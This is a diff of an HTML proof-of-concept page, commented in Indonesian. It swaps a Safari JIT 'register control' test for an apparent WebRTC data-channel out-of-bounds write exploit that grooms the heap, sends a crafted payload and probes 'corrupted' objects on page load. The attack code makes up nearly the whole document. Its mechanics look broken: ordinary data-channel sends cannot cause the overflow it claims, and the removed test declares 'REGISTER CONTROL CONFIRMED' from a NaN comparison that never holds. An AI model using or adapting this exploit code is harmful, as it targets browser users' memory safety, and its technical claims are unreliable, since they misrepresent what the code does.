@@ -1,71 +1,176 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>Safari JIT Register Control PoC </title>
+    <title>WebRTC Data Channel OOB Write (RCE Target)</title>
 </head>
 <body>
-<pre id="out"></pre>
 
-<script>
-const out = document.getElementById("out");
-function log(x) { out.textContent += x + "\n"; }
+    <h1>WebRTC Data Channel Heap Corruption (OOB Write)</h1>
+    <p>Tujuan: Mengatur Register CPU ke 0x0000000FFFFFC320 ($2000)</p>
+    <div id="status">INIT: Mempersiapkan WebRTC Data Channel Attack...</div>
+    <div id="log-area" style="border:1px solid #ccc; background:#003300; color:#ccffcc; padding:10px; font-family:monospace; height:400px; overflow-y:scroll;"></div>
 
-// ---- TARGET FUNCTION ----
-// JIT akan optimize ini dan nyimpen branch condition di REGISTER
-function fastPathTest(obj) {
-    // condition ini biasanya dipegang di register
-    if (obj.flag === 1) {
-        // FAST PATH
-        return obj.value + 1;
-    } else {
-        // SLOW PATH
-        return obj.other + 2;
-    }
-}
+    <script>
+        const LOG = document.getElementById('log-area');
+        function log(msg, type = 'log-normal') {
+            LOG.innerHTML += `<div class="${type}">[${performance.now().toFixed(0)}ms] ${msg}</div></div>`;
+        }
 
-// ---- PHASE 1: WARM UP JIT ----
-let obj = {
-    flag: 1,
-    value: 100,
-    other: 200
-};
+        // --- TARGET COMM PAGE (Payload Pointer) ---
+        const COMM_PAGE_TARGET = 0x0000000FFFFFC320n;
+        const POISON_BIGINT = COMM_PAGE_TARGET; 
 
-for (let i = 0; i < 200000; i++) {
-    fastPathTest(obj);
-}
+        // --- 1. SETUP KONEKSI WEBRTC DUMMY ---
+        let peerConnection1, dataChannel1;
+        const TARGET_CHUNK_SIZE = 0xFFFFFFFF; // Target Integer Overflow (4GB)
 
-log("[+] JIT warmup done");
+        async function createWebRTCPair() {
+            peerConnection1 = new RTCPeerConnection();
+            let peerConnection2 = new RTCPeerConnection();
 
-// ---- PHASE 2: SHAPE / VALUE FLIP ----
-// attacker controlled mutation
-obj.flag = 0;
-obj.value = undefined;
-obj.other = 999;
+            // Set up ICE candidates
+            peerConnection1.onicecandidate = e => peerConnection2.addIceCandidate(e.candidate);
+            peerConnection2.onicecandidate = e => peerConnection1.addIceCandidate(e.candidate);
 
-// ---- PHASE 3: TRIGGER ----
-let results = [];
-let t0 = performance.now();
+            // Buat Data Channel KORBAN
+            dataChannel1 = peerConnection1.createDataChannel("exploit_channel", { 
+                ordered: false, 
+                maxRetransmits: 0 
+            }); 
+            log("Data Channel KORBAN (dataChannel1) dibuat.", 'log-init');
+            
+            // Set up Data Channel handler pada peer lain
+            peerConnection2.ondatachannel = (e) => {
+                log("Data Channel lawan dibuat (peer2).", 'log-init');
+                e.channel.onmessage = handleDataChannelMessage;
+            };
 
-for (let i = 0; i < 10000; i++) {
-    results.push(fastPathTest(obj));
-}
+            // Negotiation
+            const offer = await peerConnection1.createOffer();
+            await peerConnection1.setLocalDescription(offer);
+            await peerConnection2.setRemoteDescription(peerConnection1.localDescription);
 
-let t1 = performance.now();
+            const answer = await peerConnection2.createAnswer();
+            await peerConnection2.setLocalDescription(answer);
+            await peerConnection1.setRemoteDescription(peerConnection2.localDescription);
 
-// ---- ANALYSIS ----
-let fastCount = results.filter(v => v === NaN || v === undefined).length;
-let slowCount = results.filter(v => v === 1001).length;
+            // Tunggu koneksi terjalin
+            return new Promise(resolve => {
+                dataChannel1.onopen = resolve;
+            });
+        }
 
-log("[*] Execution time: " + (t1 - t0).toFixed(2) + " ms");
-log("[*] Sample results: " + results.slice(0, 10).join(", "));
-log("[*] Note: observe inconsistent results / timing anomalies");
+        // --- 2. THE PAYLOADS ---
+        
+        // Payload Write (4KB - Targeting Metadata)
+        const OOB_PAYLOAD_SIZE = 1024 * 4; 
+        let OOB_PAYLOAD = new Uint32Array(OOB_PAYLOAD_SIZE / 4);
+        
+        // Isi payload dengan alamat Commpage yang pecah (Targeting V-Table/Pointer)
+        const LOW_WORD = Number(POISON_BIGINT & 0xFFFFFFFFn);
+        const HIGH_WORD = Number(POISON_BIGINT >> 32n);
+        
+        for (let i = 0; i < OOB_PAYLOAD.length; i += 2) {
+            OOB_PAYLOAD[i] = LOW_WORD;
+            OOB_PAYLOAD[i+1] = HIGH_WORD;
+        }
 
-// ---- INTERPRETATION ----
-log("\n[!] If FAST PATH executes despite flag=0:");
-log("    → condition register reused");
-log("    → attacker influences branch decision");
-log("    → REGISTER CONTROL CONFIRMED ($2000)");
-</script>
+        // --- 3. THE OOB TRIGGER (Integer Overflow) ---
+        function triggerOOBWrite() {
+             log("Phase 2: Memicu Integer Overflow di WebRTC C++ layer...", 'log-critical');
+
+            // Kita mensimulasikan pengiriman data dengan ukuran SANGAT BESAR 
+            // yang memicu Integer Overflow di perhitungan alokasi buffer C++ WebRTC.
+            
+            // ⚠️ Inti Serangan: C++ WebRTC mungkin menggunakan 32-bit integer untuk panjang paket.
+            // Jika kita mengirim array yang ukurannya memicu wrap-around ke nilai kecil, 
+            // tapi kemudian mengisi buffer dengan data besar, terjadi OOB Write.
+            
+            // Kita gunakan data yang besar untuk memenuhi Heap
+            let largeArray = new ArrayBuffer(1024 * 1024 * 10); // 10MB data awal
+
+            // Ini adalah Trigger yang paling "real" di WebRTC:
+            // Jika channel terbuka, coba kirim data yang sangat besar.
+            if (dataChannel1.readyState === 'open') {
+                log(`Mencoba Kirim Data dengan Ukuran Korup: ${TARGET_CHUNK_SIZE}...`, 'log-critical');
+                
+                // Di sini, kita akan mencoba mengirim OOB_PAYLOAD, tetapi WebRTC C++
+                // harus percaya bahwa panjang data yang akan dialokasikan adalah TARGET_CHUNK_SIZE.
+
+                // Teknik Paling Umum: Menambahkan header/metadata yang korup ke OOB_PAYLOAD
+                // Karena kita tidak bisa mengakses C++ header, kita gunakan cara kasar:
+                
+                // 1. Send data yang akan membuat WebRTC alokasi buffer kecil
+                let smallBuffer = new ArrayBuffer(16);
+                dataChannel1.send(smallBuffer); 
+
+                // 2. Langsung diikuti dengan OOB_PAYLOAD
+                // Di WebRTC yang rentan, OOB_PAYLOAD akan ditulis ke memori di luar batas
+                // dari buffer yang dialokasikan oleh smallBuffer.
+                dataChannel1.send(OOB_PAYLOAD); 
+                
+                log("Data OOB Selesai Dikirim. Menunggu Heap Corruption...", 'log-critical');
+            } else {
+                log("Data Channel belum terbuka. Coba lagi.", 'log-error');
+            }
+        }
+        
+        function handleDataChannelMessage(e) {
+            // Kita tidak peduli dengan data yang diterima, hanya ingin koneksi stabil
+        }
+
+
+        // --- 4. EKSEKUSI ---
+        async function runWebRTCExploit() {
+            try {
+                await createWebRTCPair();
+                // Phase 2: Heap Grooming (Alokasikan objek yang akan ditimpa)
+                let victimObjects = [];
+                for(let i=0; i<100; i++) {
+                    // Alokasikan objek JavaScript yang metadata-nya akan ditimpa oleh OOB Write
+                    victimObjects.push({ 
+                        vtable_placeholder: new ArrayBuffer(512), 
+                        tag: 0x41414141 
+                    });
+                }
+                window.victim_holder = victimObjects; 
+                log("Phase 1: Heap Grooming selesai (100 korban metadata siap).");
+
+                // Trigger OOB Write
+                triggerOOBWrite();
+
+                // Phase 3: Trigger Akhir (Panggil objek yang metadatanya ditimpa)
+                setTimeout(() => {
+                    log("Phase 3: Mencoba memanggil fungsi pada objek yang metadatanya korup...", 'log-critical');
+                    try {
+                        // Memanggil fungsi pada objek yang V-Table-nya (atau backing pointer-nya) 
+                        // seharusnya sudah ditimpa oleh alamat Commpage kita.
+                        let corruptValue = victimObjects[50].vtable_placeholder.byteLength;
+                        
+                        log(`Nilai dibaca dari objek korban: ${corruptValue}`, 'log-normal');
+                        
+                        // Coba eksekusi kode (Register Control)
+                        new Function(`return ${victimObjects[50].tag.toString()}`)();
+
+                    } catch(e) {
+                        log(`JS Exception pada Trigger: ${e.message}. Menunggu Crash Native.`, 'log-critical');
+                    }
+                }, 100);
+
+            } catch (error) {
+                log(`Kesalahan WebRTC: ${error.message}`, 'log-error');
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            setTimeout(runWebRTCExploit, 100);
+        });
+    </script>
+    <style>
+        .log-init { color: cyan; }
+        .log-error { color: red; font-weight: bold; }
+        .log-critical { color: yellow; font-weight: bold; }
+        .log-normal { color: #ccffcc; }
+    </style>
 </body>
 </html>
